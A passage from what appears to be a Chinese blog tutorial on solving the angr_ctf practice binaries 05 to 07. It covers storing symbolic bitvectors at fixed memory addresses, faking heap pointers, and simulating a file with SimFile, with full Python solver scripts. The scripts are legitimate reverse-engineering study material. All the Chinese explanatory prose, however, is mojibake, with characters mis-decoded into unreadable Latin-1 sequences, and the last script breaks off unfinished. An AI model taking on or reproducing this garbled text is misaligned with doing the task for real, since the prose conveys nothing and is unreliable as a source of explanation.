å‡½æ•°ä¹‹åç¬¦å·æ‰§è¡Œï¼Œä½†æ˜¯è¿™é‡Œæœ‰äº†å››ä¸ªæŒ‡å®šçš„å†…å­˜åœ°å€ï¼Œéœ€è¦ä½¿ç”¨å®ƒä»¬è¿›è¡Œæ±‚è§£ã€‚æŸ¥çœ‹ scaffold05.py å†…å®¹å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> claripy<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token punctuation">:</span>  path_to_binary <span class="token operator">=</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>  project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">)</span>  start_address <span class="token operator">=</span> ???  initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span>start_address<span class="token punctuation">)</span>  password0 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password0'</span><span class="token punctuation">,</span> ???<span class="token punctuation">)</span>    password0_address <span class="token operator">=</span> ???  initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>password0_address<span class="token punctuation">,</span> password0<span class="token punctuation">)</span>    simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>  <span class="token keyword">def</span> <span class="token function">is_successful</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> ???  <span class="token keyword">def</span> <span class="token function">should_abort</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> ???  simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>is_successful<span class="token punctuation">,</span> avoid<span class="token operator">=</span>should_abort<span class="token punctuation">)</span>  <span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    solution0 <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>se<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>password0<span class="token punctuation">,</span>cast_to<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    solution <span class="token operator">=</span> ???    <span class="token keyword">print</span><span class="token punctuation">(</span>solution<span class="token punctuation">)</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>  main<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç›¸åŒä»£ç éƒ¨åˆ†å°±ä¸è¯¦ç»†èµ˜è¿°äº†ï¼Œæœ‰ä¸æ¸…æ¥šçš„åœ°æ–¹å¯ä»¥å‚è€ƒå‰é¢<a href="https://unrav31.github.io/2022/04/26/angr-ru-men/">angrå…¥é—¨</a> ã€‚ä¸»è¦çœ‹çœ‹  <code>  initial_state.memory.store(password0_address, password0)</code> ï¼Œå¯ä»¥æŠŠå‘é‡å€¼ <code>password0</code> å­˜å‚¨åˆ°æŒ‡å®šçš„åœ°å€ <code>password0_address</code> ä¸­ã€‚æˆ‘ä»¬ç°åœ¨å·²çŸ¥çš„å››ä¸ªåœ°å€ä¸º 0x0A1BA1C0ã€0x0A1BA1C8ã€0x0A1BA1D0ã€0x0A1BA1D8 ï¼Œé‚£ä¹ˆå°±éœ€è¦åˆ›å»ºå››ä¸ªå‘é‡å€¼ä»¥æ­¤ä¼ å…¥ã€‚æœ€åç›´æ¥çœ‹ä¿®æ”¹åçš„ä»£ç ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> claripy<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token punctuation">:</span>  path_to_binary <span class="token operator">=</span> <span class="token string">"./05_angr_symbolic_memory"</span>  project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">)</span>  start_address <span class="token operator">=</span> <span class="token number">0x08048601</span>  initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span>start_address<span class="token punctuation">)</span>  password0 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password0'</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span>  password1 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password1'</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span>  password2 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password2'</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span>  password3 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password3'</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span>  password0_address <span class="token operator">=</span> <span class="token number">0x0A1BA1C0</span>  password1_address <span class="token operator">=</span> <span class="token number">0x0A1BA1C8</span>  password2_address <span class="token operator">=</span> <span class="token number">0x0A1BA1d0</span>  password3_address <span class="token operator">=</span> <span class="token number">0x0A1BA1d8</span>  initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>password0_address<span class="token punctuation">,</span> password0<span class="token punctuation">)</span>  initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>password1_address<span class="token punctuation">,</span> password1<span class="token punctuation">)</span>  initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>password2_address<span class="token punctuation">,</span> password2<span class="token punctuation">)</span>  initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>password3_address<span class="token punctuation">,</span> password3<span class="token punctuation">)</span>  simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>  <span class="token keyword">def</span> <span class="token function">is_successful</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">b'Good Job.'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token boolean">False</span>  <span class="token keyword">def</span> <span class="token function">should_abort</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">b'Try again.'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token boolean">False</span>  simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>is_successful<span class="token punctuation">,</span> avoid<span class="token operator">=</span>should_abort<span class="token punctuation">)</span>  <span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    solution0 <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>password0<span class="token punctuation">,</span>cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span>    solution1 <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>password1<span class="token punctuation">,</span>cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span>    solution2 <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>password2<span class="token punctuation">,</span>cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span>    solution3 <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>password3<span class="token punctuation">,</span>cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span>      solution <span class="token operator">=</span> solution0 <span class="token operator">+</span> <span class="token string">b" "</span> <span class="token operator">+</span> solution1 <span class="token operator">+</span> <span class="token string">b" "</span><span class="token operator">+</span> solution2 <span class="token operator">+</span> <span class="token string">b" "</span><span class="token operator">+</span>solution3    <span class="token keyword">print</span><span class="token punctuation">(</span>solution<span class="token punctuation">)</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>  main<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä»£ç è§£è¯»ï¼š</p><ul><li><p><code>start_address</code> é€‰æ‹© 0x08048601 æ˜¯å› ä¸ºè¿™é‡Œæ˜¯ <code>scanf</code> å‡½æ•°ç»“æŸçš„ä½ç½®ï¼Œå¹¶ä¸”æ˜¯ä¸€ä¸ª <code> for</code> å¾ªç¯çš„å¼€å§‹ä½ç½®ï¼Œå®ƒå¾ªç¯äº†31æ¬¡ï¼š</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220501110551215.png" alt="image-20220501110551215"></p></li><li><p><code>claripy.BVS(&#39;password&#39;, 64)</code> ï¼Œå› ä¸ºæ¯ä¸ªåœ°å€å­˜å‚¨ 8 å­—èŠ‚ï¼Œé‚£ä¹ˆå°±æ˜¯ 64 ä½ </p></li><li><p><code>solution_state.solver.eval(password,cast_to=bytes)</code> æ˜¯ä¸€ä¸ªæ ¼å¼åŒ–å†…å®¹çš„ä½œç”¨ï¼Œå°†å‘é‡è½¬ä¸º <code>bytes</code> ç±»å‹</p></li></ul><p>æœ€åå¾—åˆ°ç»“æœï¼š</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220501110026973.png" alt="image-20220501110026973"></p><h1 id="Part-5-angr-symbolic-dynamic-memory"><a href="#Part-5-angr-symbolic-dynamic-memory" class="headerlink" title="Part 5 angr symbolic dynamic memory"></a>Part 5 angr symbolic dynamic memory</h1><p>å…¶å®è¿™ä¸€éƒ¨åˆ†å’Œ Part 4 åŸç†å·®ä¸å¤šï¼Œåªæ˜¯å°†è¾“å…¥å†…å®¹å­˜å‚¨åˆ°äº†åˆ†é…çš„å †å—å†…å®¹ä¸­ï¼Œè¿™éƒ¨åˆ†æ¥çœ‹çœ‹å¦‚ä½•åº”å¯¹è¿™ç§éšæœºåœ°å€çš„é—®é¢˜ã€‚</p><p>ä½¿ç”¨ IDA æŸ¥çœ‹ç¨‹åºé€»è¾‘ï¼Œä¾ç„¶æ˜¯ç”¨ <code>scanf</code> è·å–è¾“å…¥ï¼Œå­˜å‚¨åˆ° <code>malloc</code> å‡½æ•°è¿”å›çš„åœ°å€ä¸­ï¼Œ<code>buffer0</code> å’Œ <code>buffer1</code> éƒ½æ˜¯ bss æ®µåœ°å€ï¼Œéšåå¯¹è¾“å…¥è¿›è¡Œå¤„ç†ï¼Œæœ€ååˆ†åˆ«å¯¹æ¯”ä¸¤ä¸ªåœ°å€å†…å®¹ï¼ŒæˆåŠŸè¾“å‡ºâ€Good Jobâ€ï¼Œå¤±è´¥è¾“å‡ºâ€Try againâ€ï¼š</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220501113842249.png" alt="image-20220501113842249"></p><p>å…¶å® angr å¹¶æ²¡æœ‰çœŸæ­£çš„æ‰§è¡Œç¨‹åºï¼Œæ‰€ä»¥è¯´åœ¨ç¬¦å·æ‰§è¡Œ <code>malloc</code> çš„æ—¶å€™å¹¶ä¸æ˜¯çœŸæ­£çš„åˆ†é…äº†ä¸€ä¸ªå †å—ï¼Œæˆ‘ä»¬åªéœ€è¦åˆ†åˆ«éšæ„å†™ä¸€ä¸ªåœ°å€åˆ° <code>buffer0</code> å’Œ <code>buffer1</code> å…¨å±€å˜é‡ä¸­å³å¯ã€‚æ¥ä¸‹æ¥æŸ¥çœ‹å®Œæ•´ä»£ç ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> claripy<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token punctuation">:</span>  path_to_binary <span class="token operator">=</span> <span class="token string">"./06_angr_symbolic_dynamic_memory"</span>  project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">)</span>  start_address <span class="token operator">=</span> <span class="token number">0x08048699</span>  initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span>start_address<span class="token punctuation">)</span>  password0 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password0'</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span>  password1 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password1'</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span>  fake_heap_address0 <span class="token operator">=</span> <span class="token number">0x12345678</span>  pointer_to_malloc_memory_address0 <span class="token operator">=</span> <span class="token number">0x0ABCC8A4</span>  fake_heap_address1 <span class="token operator">=</span> <span class="token number">0x12345680</span>  pointer_to_malloc_memory_address1 <span class="token operator">=</span> <span class="token number">0x0ABCC8AC</span>  initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>pointer_to_malloc_memory_address0<span class="token punctuation">,</span> fake_heap_address0<span class="token punctuation">,</span> endness<span class="token operator">=</span>project<span class="token punctuation">.</span>arch<span class="token punctuation">.</span>memory_endness<span class="token punctuation">)</span>  initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>pointer_to_malloc_memory_address1<span class="token punctuation">,</span> fake_heap_address1<span class="token punctuation">,</span> endness<span class="token operator">=</span>project<span class="token punctuation">.</span>arch<span class="token punctuation">.</span>memory_endness<span class="token punctuation">)</span>  initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>fake_heap_address0<span class="token punctuation">,</span> password0<span class="token punctuation">)</span>  initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>fake_heap_address1<span class="token punctuation">,</span> password1<span class="token punctuation">)</span>  simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>  <span class="token keyword">def</span> <span class="token function">is_successful</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">b'Good Job.'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token boolean">False</span>  <span class="token keyword">def</span> <span class="token function">should_abort</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">b'Try again.'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token boolean">False</span>  simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>is_successful<span class="token punctuation">,</span> avoid<span class="token operator">=</span>should_abort<span class="token punctuation">)</span>  <span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    solution0 <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>password0<span class="token punctuation">,</span>cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span>    solution1 <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>password1<span class="token punctuation">,</span>cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span>    solution <span class="token operator">=</span> solution0 <span class="token operator">+</span> <span class="token string">b' '</span> <span class="token operator">+</span> solution1    <span class="token keyword">print</span><span class="token punctuation">(</span>solution<span class="token punctuation">)</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>  main<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä»£ç è§£è¯»ï¼š</p><ul><li><p><code>start_address</code> ä¾ç„¶æ˜¯ <code>scanf</code> å‡½æ•°ç»“å°¾ï¼Œå¹¶ä¸”æ˜¯å¾ªç¯å¼€å§‹çš„åœ°å€</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220501114723729.png" alt="image-20220501114723729"></p></li><li><p><code>claripy.BVS(&#39;password&#39;, 64)</code> è¾“å…¥çš„ä¹Ÿæ˜¯ 8 å­—èŠ‚ï¼Œæ‰€ä»¥æ˜¯ 64 ä½</p></li><li><p>æ¥ä¸‹æ¥è¿™æ®µä»£ç ï¼Œåˆ†åˆ«å°†ä¼ªé€ çš„å †åœ°å€ 0x12345678ã€ 0x12345680 å†™å…¥åˆ°å…¨å±€å˜é‡ <code>buffer0</code>ã€<code>buffer1</code> ä¸­ï¼š</p></li></ul>  <pre class="line-numbers language-python" data-language="python"><code class="language-python">fake_heap_address0 <span class="token operator">=</span> <span class="token number">0x12345678</span>pointer_to_malloc_memory_address0 <span class="token operator">=</span> <span class="token number">0x0ABCC8A4</span>fake_heap_address1 <span class="token operator">=</span> <span class="token number">0x12345680</span>pointer_to_malloc_memory_address1 <span class="token operator">=</span> <span class="token number">0x0ABCC8AC</span>initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>pointer_to_malloc_memory_address0<span class="token punctuation">,</span> fake_heap_address0<span class="token punctuation">,</span> endness<span class="token operator">=</span>project<span class="token punctuation">.</span>arch<span class="token punctuation">.</span>memory_endness<span class="token punctuation">)</span>initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>pointer_to_malloc_memory_address1<span class="token punctuation">,</span> fake_heap_address1<span class="token punctuation">,</span> endness<span class="token operator">=</span>project<span class="token punctuation">.</span>arch<span class="token punctuation">.</span>memory_endness<span class="token punctuation">)</span>  initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>fake_heap_address0<span class="token punctuation">,</span> password0<span class="token punctuation">)</span>initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>fake_heap_address1<span class="token punctuation">,</span> password1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æŠŠä¼ªé€ åœ°å€ç»™äº† <code>buffer0</code> å’Œ <code>buffer1</code> ä¹‹åï¼Œå¤„ç†èµ·æ¥å°±å’Œ Part4 çš„è¿‡ç¨‹ä¸€æ ·äº†ã€‚æœ€åæ±‚è§£å¾—åˆ°ç»“æœï¼š</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220501113539990.png" alt="image-20220501113539990"></p><h1 id="Part-6-angr-symbolic-file"><a href="#Part-6-angr-symbolic-file" class="headerlink" title="Part 6 angr symbolic file"></a>Part 6 angr symbolic file</h1><p>07_angr_symbolic_file ä¾‹å­å¯ä»¥ç”¨äºå­¦ä¹ å¦‚ä½•æ¨¡æ‹Ÿä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œå½“ç„¶è¿˜å¯ä»¥ç”¨ä¹‹å‰å­¦ä¹ è¿‡çš„æ–¹å¼è§£å†³é—®é¢˜ã€‚IDA åˆ†ææ–‡ä»¶ï¼Œä½¿ç”¨ <code>fread</code> å‡½æ•°ä»æ–‡ä»¶ä¸­è¯»å–å†…å®¹ï¼Œå¤„ç†åè¿›è¡Œå¯¹æ¯”ï¼Œå¦‚æœæ­£ç¡®è¾“å‡ºâ€Good Jobâ€ï¼Œ<code>ignore_me</code> å°†è¾“å…¥å†…å®¹å†™å…¥åˆ°æ–‡ä»¶ä¸­ï¼Œæ˜¯éœ€è¦ç»•è¿‡çš„å‡½æ•°ï¼š</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220502111158805.png" alt="image-20220502111158805"></p><p>ç°åœ¨è¦å¤„ç†çš„é—®é¢˜ï¼š</p><ul><li>ç¡®å®š <code>fread</code> è¯»å–çš„æ–‡ä»¶</li><li>ä½¿ç”¨ angr æ¨¡æ‹Ÿä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œæ›¿æ¢ <code>fread</code> è¯»å–çš„æ–‡ä»¶ä¸ºæˆ‘ä»¬è‡ªå·±çš„æ–‡ä»¶</li><li>ç”¨ç¬¦å·å€¼åˆå§‹åŒ–æ–‡ä»¶ï¼Œç”¨ <code>fread</code> è¯»å–å¹¶ä¼ æ’­æ±‚è§£ï¼Œæœ€åå¾—åˆ°æ­£ç¡®å¯†ç </li></ul><p>é¦–å…ˆç¡®å®š <code>start_address</code> ã€‚é€šè¿‡åˆ†æï¼Œç¨‹åºä» 0x080488EA å¼€å§‹æ‰“å¼€ OJKSQYDP.txt æ–‡ä»¶ï¼š</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220502122135428.png" alt="image-20220502122135428"></p><p>ç„¶åæŒ‡å®šæ¨¡æ‹Ÿæ–‡ä»¶æ‰€éœ€çš„ä¿¡æ¯ï¼Œç¨‹åºä¸­æ‰“å¼€çš„æ–‡ä»¶åç§°æ˜¯å›ºå®šçš„ï¼Œå¯ä»¥ç”¨ç¬¦å·æ›¿æ¢æ–‡ä»¶åã€‚ç”± <code>%64s</code> å¯ä»¥å¾—çŸ¥å†™å…¥çš„æ–‡ä»¶å¤§å°ä¸º 64 å­—èŠ‚ï¼Œä½†å®é™…åªå¾ªç¯è¯»å–äº† 8 å­—èŠ‚ï¼Œåœ¨åˆ›å»ºå‘é‡çš„æ—¶å€™å°±æ˜¯ 64 ä½ã€‚ç„¶åä½¿ç”¨ angr çš„ <code>SimFile</code> æ¨¡å—æ¨¡æ‹Ÿæ–‡ä»¶ç³»ç»Ÿï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">filename <span class="token operator">=</span> <span class="token string">'OJKSQYDP.txt'</span>  symbolic_file_size_bytes <span class="token operator">=</span> <span class="token number">64</span>password <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">,</span> symbolic_file_size_bytes<span class="token punctuation">)</span>password_file <span class="token operator">=</span> angr<span class="token punctuation">.</span>storage<span class="token punctuation">.</span>SimFile<span class="token punctuation">(</span>filename<span class="token punctuation">,</span>  content<span class="token operator">=</span>password<span class="token punctuation">,</span>size<span class="token operator">=</span>symbolic_file_size_bytes<span class="token punctuation">)</span>initial_state<span class="token punctuation">.</span>fs<span class="token punctuation">.</span>insert<span class="token punctuation">(</span>filename<span class="token punctuation">,</span>password_file<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¹‹åå°±æ˜¯æŒ‡å®š <code>find</code> å’Œ <code>avoid</code>ã€‚å®Œæ•´ä»£ç å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> claripy<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token punctuation">:</span>  path_to_binary <span class="token operator">=</span> <span class="token string">'./07_angr_symbolic_file'</span>  project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">)</span>  start_address <span class="token operator">=</span> <span class="token number">0x080488D6</span>  initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span>start_address<span class="token punctuation">)</span>    filename <span class="token operator">=</span> <span class="token string">'OJKSQYDP.txt'</span>  <span class="token comment"># :string</span>  symbolic_file_size_bytes <span class="token operator">=</span> <span class="token number">64</span>  password <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">,</span> symbolic_file_size_bytes<span class="token punctuation">)</span>  password_file <span class="token operator">=</span> 